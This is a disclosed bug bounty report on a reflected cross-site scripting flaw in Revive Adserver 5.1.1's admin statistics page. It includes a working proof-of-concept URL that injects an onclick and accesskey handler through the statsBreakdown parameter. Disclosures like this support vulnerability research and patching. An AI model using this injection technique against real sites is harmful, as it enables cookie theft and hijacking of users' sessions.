# Reflected XSS on /admin/stats.php

## Report Details
- **Report ID**: 1097217
- **URL**: https://hackerone.com/reports/1097217
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-02-06T15:07:34.473Z
- **Disclosed**: 2021-03-16T15:08:42.201Z

## Reporter
- **Username**: solov9ev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: revive_adserver

## Vulnerability Information
Linked to the report [https://hackerone.com/reports/1083376](https://hackerone.com/reports/1083376)
I found a reflected XSS attack on `/admin/stats.php`.

Revive-Adserver version is `revive-adserver-5.1.1`.

### This time I found the parameter `statsBreakdown`

- Go to `http://revive-adserver.loc/admin/stats.php?statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20&listorder=key&orderdirection=up&day=&setPerPage=15&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020`

- For the payload to be executed, the user needs to press the access key combination for the hidden input field (for Firefox, Alt+Shift+X, see [this](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/accesskey) for other browsers).

{F1186275}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

## Attachments
- _________________2021-02-06_17-59-59.png
